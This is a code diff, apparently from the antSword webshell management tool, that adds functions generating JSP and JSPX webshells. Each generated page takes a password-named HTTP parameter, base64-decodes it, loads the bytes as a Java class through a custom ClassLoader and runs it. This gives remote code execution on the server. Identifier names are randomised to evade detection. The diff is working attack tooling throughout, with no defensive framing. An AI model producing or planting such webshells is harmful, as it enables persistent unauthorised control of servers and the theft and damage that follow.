@@ -14,12 +14,86 @@ class Core {
           break;
         case "aspx":
           break;
+        case "jsp":
+          res(self._gen_jsp(argv.pwd));
+          break;
+        case "jspx":
+          res(self._gen_jspx(argv.pwd));
+          break;
         default:
           break;
       }
     })
   }
 
+  _gen_jspx(pwd) {
+    var data = `<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2">
+  <jsp:declaration>
+    class PCLASSNAME extends ClassLoader {
+      PCLASSNAME(ClassLoader c) { super(c);}
+      public Class SCLASSNAME(byte[] b) {
+        return super.defineClass(b, 0, b.length);
+      }
+    }
+    public byte[] B64FUNCNAME(String str) throws Exception {
+      try {
+        Class clazz = Class.forName("sun.misc.BASE64Decoder");
+        return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
+      } catch (Exception e) {
+        Class clazz = Class.forName("java.util.Base64");
+        Object decoder = clazz.getMethod("getDecoder").invoke(null);
+        return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
+      }
+    }
+  </jsp:declaration>
+  <jsp:scriptlet>
+    String cls = request.getParameter("ASPWD");
+    if (cls != null) {
+      new PCLASSNAME(this.getClass().getClassLoader()).SCLASSNAME(B64FUNCNAME(cls)).newInstance().equals(request);
+    }
+  </jsp:scriptlet>
+</jsp:root>`;
+    let vars = antSword['utils'].RandomChoice(antSword['RANDOMWORDS'], [], 6);
+    data = data.replace(/PCLASSNAME/g, vars[0].toUpperCase());
+    data = data.replace(/SCLASSNAME/g, vars[1]);
+    data = data.replace(/B64FUNCNAME/g, vars[2]);
+    data = data.replace("ASPWD", pwd);
+    return data;
+  }
+
+  _gen_jsp(pwd) {
+    var data = `<%!
+class PCLASSNAME extends ClassLoader{
+  PCLASSNAME(ClassLoader c){super(c);}
+  public Class SCLASSNAME(byte[] b){
+    return super.defineClass(b, 0, b.length);
+  }
+}
+public byte[] B64FUNCNAME(String str) throws Exception {
+  try {
+    Class clazz = Class.forName("sun.misc.BASE64Decoder");
+    return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
+  } catch (Exception e) {
+    Class clazz = Class.forName("java.util.Base64");
+    Object decoder = clazz.getMethod("getDecoder").invoke(null);
+    return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
+  }
+}
+%>
+<%
+String cls = request.getParameter("ASPWD");
+if (cls != null) {
+  new PCLASSNAME(this.getClass().getClassLoader()).SCLASSNAME(B64FUNCNAME(cls)).newInstance().equals(request);
+}
+%>
+`;
+    let vars = antSword['utils'].RandomChoice(antSword['RANDOMWORDS'], [], 6);
+    data = data.replace(/PCLASSNAME/g, vars[0].toUpperCase());
+    data = data.replace(/SCLASSNAME/g, vars[1]);
+    data = data.replace(/B64FUNCNAME/g, vars[2]);
+    data = data.replace("ASPWD", pwd);
+    return data;
+  }
   // 生成 php shell
   _gen_php(pwd){
     let self = this;
